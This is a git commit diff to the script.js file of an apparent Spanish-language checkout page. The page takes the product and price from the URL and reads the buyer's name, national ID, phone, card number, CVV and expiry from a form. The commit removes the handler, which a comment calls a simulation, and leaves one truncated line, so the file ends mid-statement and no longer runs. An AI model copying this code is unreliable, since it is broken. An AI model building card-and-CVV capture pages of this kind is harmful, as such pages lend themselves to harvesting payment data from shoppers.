1cae1824285cd701f938a40f801938f6817f6abf
momzamoa-png <momzamoa@gmail.com>
2025-09-17 09:03:45 -0500

    Add files via upload

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-document.addEventListener("DOMContentLoaded", () => {
+﻿document.addEventListener("DOMContentLoaded", () => {
   const params = new URLSearchParams(window.location.search);
   const producto = params.get("producto");
   const precio = params.get("precio");
@@ -13,23 +13,4 @@ document.addEventListener("DOMContentLoaded", () => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      const data = {
-        producto: document.getElementById("producto").value,
-        precio: document.getElementById("precio").value,
-        nombre: document.getElementById("nombre").value,
-        dni: document.getElementById("dni").value,
-        celular: document.getElementById("celular").value,
-        tarjeta: document.getElementById("tarjeta").value,
-        cvv: document.getElementById("cvv").value,
-        fecha: document.getElementById("fecha").value,
-      };
-
-      try {
-        // Simulación: redirigir a página de "procesando"
-        window.location.href = "procesando.html";
-      } catch (error) {
-        alert("Ocurrió un error al enviar el pedido.");
-      }
-    });
-  }
-});
+      const tarjeta = document.getElementById("tarjeta").
